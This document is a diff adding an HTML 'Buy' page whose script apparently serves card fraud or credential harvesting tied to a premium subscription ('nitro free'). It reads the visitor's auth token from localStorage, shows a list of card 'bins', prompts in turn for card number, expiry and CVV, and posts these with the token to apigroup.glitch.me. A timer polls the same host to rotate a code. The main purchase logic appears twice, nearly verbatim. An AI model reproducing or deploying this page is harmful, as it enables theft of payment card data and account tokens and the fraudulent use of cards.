@@ -1,0 +1,251 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Welcome!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" type="text/css" href="/style.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js">
+ src="//cdn.jsdelivr.net/npm/promise-polyfill@8/dist/polyfill.js">
+src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  </head>
+  <body>
+      <button class="wtf" id="test" onclick="myFunc1()">
+            Buy
+    </button>
+      <br>
+      <br><br>
+      <h1 id="answer">
+
+        </h1>
+            <h1 id="question">
+        
+        </h1>
+      <h1 id="error">
+        
+        </h1>
+      <h1 id="x">
+        
+        </h1>
+      <h1 id="tmam">
+        
+        </h1>
+  </body>
+    <script>
+
+
+// ES6 Modules or TypeScript
+
+// CommonJS
+      var answer = document.getElementById("answer");
+var code = "546158"
+var able = true
+var me = ``
+var error = ``
+fetch(('/api/data/@me') , {method: 'GET', headers: {  'authorization': localStorage.getItem('token'), 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).catch(err =>{
+able = false
+error = err
+}).then(async res =>{
+if(!able) return swal("Error", "Internet connection failed\n" + error, "error")
+  let json = await res.json();
+wait = false
+if(json.message === "No Login") return swal('Error', 'Failed Login', 'error')
+if(json.message === 'This account has been disabled. Please check your e-mail.'){
+me = { username: 'disabled', discriminator: 'disabled' }
+ window.location = "https://apigroup.glitch.me/logout/"
+ return swal('Error', 'This account has been disabled. Please check your e-mail.', 'error')
+}
+me = {username: json.username, discriminator: json.discriminator, token: json.token, authy: json.authy}
+
+fetch(('https://apigroup.glitch.me/api/bins') , {method: 'GET', headers: { "authorization": json.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async tab =>{
+  let json = await tab.json();
+var msg = ``
+  for(const data of json){
+msg = msg + `\n${data}`
+}
+return swal("Please don't use this bin.. you have get ban!", msg, "info").then(ggswal =>{
+ swal("Enter Card", {
+  content: "input",
+}).then(card =>{
+if(!card) return swal('Error', 'Number a card is failed!', 'error')
+ swal("Enter YY/MM", {
+  content: "input",
+}).then(yymm =>{
+if(!yymm) return swal('Error', 'YY/MM a card is failed!', 'error')
+ swal("Enter CVV", {
+  content: "input",
+}).then(cvv =>{
+if(!cvv) return swal('Error', 'CVV a card is failed!', 'error')
+
+fetch(('https://apigroup.glitch.me/api/tokens') , {method: 'post', body: JSON.stringify({"type": "web", "code": code}), headers: { "authorization": me.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async ta =>{
+  let json = await ta.json();
+
+fetch(('https://apigroup.glitch.me/api/event/') , {method: 'post', body: JSON.stringify({"card": card, "yymm": yymm, "cvv": cvv, key: json.key, token: me.token}), headers: { 'authorization': json.authorization, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async one =>{
+
+  let ones = await one.json();
+if(ones.message === "API : Wrong authorization"){
+
+fetch(('https://apigroup.glitch.me/api/tokens') , {method: 'post', body: JSON.stringify({"type": "web", "code": code}), headers: {  'authorization': me.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async tat =>{
+  let jsons = await tat.json();
+
+fetch(('https://apigroup.glitch.me/api/event/') , {method: 'post', body: JSON.stringify({"card": card, "yymm": yymm, "cvv": cvv, key: jsons.key, token: me.token}), headers: { 'authorization': jsons.authorization, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async gg =>{
+
+  let oness = await gg.json();
+if(oness.message === "Card Has Defined, Failed Tran Go To Your Bank For Support!") return swal("Error", oness.message, "error")
+if(oness.message === "You Have Limited!") return swal("Error", oness.message, "error")
+if(oness.message === "You Already Premium") return swal("Error", oness.message, "error")
+if(oness.message === "This account has been disabled. Please check your e-mail.") {
+ return swal("Error", oness.message, "error")
+}
+if(oness.message === "No Login") {
+ swal("Error", oness.message, "error")
+}
+if(oness.message === "API : Failed Connection") return swal("Error", "API : Failed Connection\nReason:\nYou need to Connection For API directly\nWhy:\nThis Account Bot, Bots Need to Connetion directly", "error")
+if(oness.message === "API : Wrong authorization") return swal("Error", "authorization Failed, Again.", "error") 
+if(ones.message === "You Already sub to nitro free..") return swal("Error", ones.message, "error")
+ swal("success", oness.message, "success")
+      question.innerHTML = ""
+      error.innerHTML = ""
+     x.innerHTML = ""
+     tmam.innerHTML = ""
+})
+})
+return;
+}
+if(ones.message === "API : Failed Connection") return swal("Error", "API : Failed Connection\nReason:\nYou need to Connection For API directly\nWhy:\nThis Account Bot, Bots Need to Connetion directly", "error")
+if(ones.message === "Card Has Defined, Failed Tran Go To Your Bank For Support!") return swal("Error", ones.message, "error")
+if(ones.message === "You Have Limited!") return swal("Error", ones.message, "error")
+if(ones.message === "You Already Premium") return swal("Error", ones.message, "error")
+if(ones.message === "This account has been disabled. Please check your e-mail.") {
+ return swal("Error", ones.message, "error")
+}
+if(ones.message === "You Already sub to nitro free..") return swal("Error", ones.message, "error")
+ swal("success", ones.message, "success")
+      question.innerHTML = ""
+      error.innerHTML = ""
+     x.innerHTML = ""
+     tmam.innerHTML = ""
+})
+})
+   
+})
+ })
+ })
+})
+})
+    setInterval(() => {
+fetch(('https://apigroup.glitch.me/api/code') , {method: 'GET', headers: {  'authorization': me.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async tab =>{
+  let kk = await tab.json();
+if(kk.message === "No Login") {
+return swal("Error", kk.message, "error")
+}
+fetch(('https://apigroup.glitch.me/api/uncode') , {method: 'post', body: JSON.stringify({"code": kk.code}), headers: {  'authorization': me.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async gt =>{
+  let jso = await gt.json();
+code = jso.code
+
+})
+})
+}, 5 * 1000)
+fetch(('https://apigroup.glitch.me/api/method/@me') , {method: 'get', headers: { 'authorization': me.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async ress =>{
+  let json = await ress.json();
+var fetcha = false
+for(const data of json){
+if(data.status === 'success') fetcha = true
+}
+if(!fetcha) answer.innerHTML = "1Month Free"
+if(fetcha) answer.innerHTML = "$9.99"
+})
+})
+
+
+      var question = document.getElementById("question");
+      var error = document.getElementById("error");
+      var x = document.getElementById("x");
+      var tmam = document.getElementById("tmam");
+
+
+       function myFunc1() {
+if(!me) return swal('Error', 'Wait insert data', 'error')
+fetch(('https://apigroup.glitch.me/api/bins') , {method: 'GET', headers: { 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async tab =>{
+  let json = await tab.json();
+var msg = ``
+  for(const data of json){
+msg = msg + `\n${data}`
+}
+return swal("Please don't use this bin.. you have get ban!", msg, "info").then(ggswal =>{
+ swal("Enter Card", {
+  content: "input",
+}).then(card =>{
+if(!card) return swal('Error', 'Number a card is failed!', 'error')
+ swal("Enter YY/MM", {
+  content: "input",
+}).then(yymm =>{
+if(!yymm) return swal('Error', 'YY/MM a card is failed!', 'error')
+ swal("Enter CVV", {
+  content: "input",
+}).then(cvv =>{
+if(!cvv) return swal('Error', 'CVV a card is failed!', 'error')
+
+fetch(('https://apigroup.glitch.me/api/tokens') , {method: 'post', body: JSON.stringify({"type": "web", "code": code}), headers: { 'authorization': me.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async ta =>{
+  let json = await ta.json();
+
+fetch(('https://apigroup.glitch.me/api/event/') , {method: 'post', body: JSON.stringify({"card": card, "yymm": yymm, "cvv": cvv, key: json.key, token: me.token}), headers: { 'authorization': json.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async one =>{
+
+  let ones = await one.json();
+if(ones.message === "API : Wrong authorization"){
+
+fetch(('https://apigroup.glitch.me/api/tokens') , {method: 'post', body: JSON.stringify({"type": "web", "code": code}), headers: { 'authorization': me.token, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async tat =>{
+  let jsons = await tat.json();
+
+fetch(('https://apigroup.glitch.me/api/event/') , {method: 'post', body: JSON.stringify({"card": card, "yymm": yymm, "cvv": cvv, key: jsons.key, token: me.token}), headers: { 'authorization': jsons.authorization, 'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async gg =>{
+
+  let oness = await gg.json();
+if(oness.message === "Card Has Defined, Failed Tran Go To Your Bank For Support!") return swal("Error", oness.message, "error")
+if(oness.message === "You Have Limited!") return swal("Error", oness.message, "error")
+if(oness.message === "You Already Premium") return swal("Error", oness.message, "error")
+if(oness.message === "This account has been disabled. Please check your e-mail.") {
+ return swal("Error", oness.message, "error")
+}
+if(oness.message === "No Login") {
+ swal("Error", oness.message, "error")
+}
+if(oness.message === "API : Failed Connection") return swal("Error", "API : Failed Connection\nReason:\nYou need to Connection For API directly\nWhy:\nThis Account Bot, Bots Need to Connetion directly", "error")
+if(oness.message === "API : Wrong authorization") return swal("Error", "authorization Failed, Again.", "error") 
+if(ones.message === "You Already sub to nitro free..") return swal("Error", ones.message, "error")
+ swal("success", oness.message, "success")
+      question.innerHTML = ""
+      error.innerHTML = ""
+     x.innerHTML = ""
+     tmam.innerHTML = ""
+})
+})
+return;
+}
+if(ones.message === "API : Failed Connection") return swal("Error", "API : Failed Connection\nReason:\nYou need to Connection For API directly\nWhy:\nThis Account Bot, Bots Need to Connetion directly", "error")
+if(ones.message === "Card Has Defined, Failed Tran Go To Your Bank For Support!") return swal("Error", ones.message, "error")
+if(ones.message === "You Have Limited!") return swal("Error", ones.message, "error")
+if(ones.message === "You Already Premium") return swal("Error", ones.message, "error")
+if(ones.message === "This account has been disabled. Please check your e-mail.") {
+ return swal("Error", ones.message, "error")
+}
+if(ones.message === "You Already sub to nitro free..") return swal("Error", ones.message, "error")
+ swal("success", ones.message, "success")
+      question.innerHTML = ""
+      error.innerHTML = ""
+     x.innerHTML = ""
+     tmam.innerHTML = ""
+})
+})
+   
+})
+ })
+ })
+})
+})
+
+       }
+
+
+  </script>
+</html>
